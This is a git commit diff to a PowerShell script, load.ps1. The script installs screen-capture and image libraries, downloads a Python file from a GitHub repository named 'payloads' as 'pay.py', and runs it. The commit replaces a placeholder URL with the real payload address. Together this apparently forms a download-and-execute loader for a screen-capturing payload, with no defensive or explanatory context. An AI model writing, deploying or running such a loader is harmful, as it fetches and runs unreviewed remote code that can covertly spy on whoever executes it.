3896de63a7f9b9d05bdfb48062b81517d464c47f
LUBRJ <145651445+lubrj@users.noreply.github.com>
2026-05-05 06:01:34 +0000

    Update script download URL in load.ps1

--- load.ps1
+++ load.ps1
@@ -1,3 +1,3 @@
 pip install mss opencv-python numpy
-iwr "https://example.com/script.py" -OutFile "pay.py"
+iwr "https://raw.githubusercontent.com/lubrj/payloads/refs/heads/main/look.py" -OutFile "pay.py"
 python pay.py
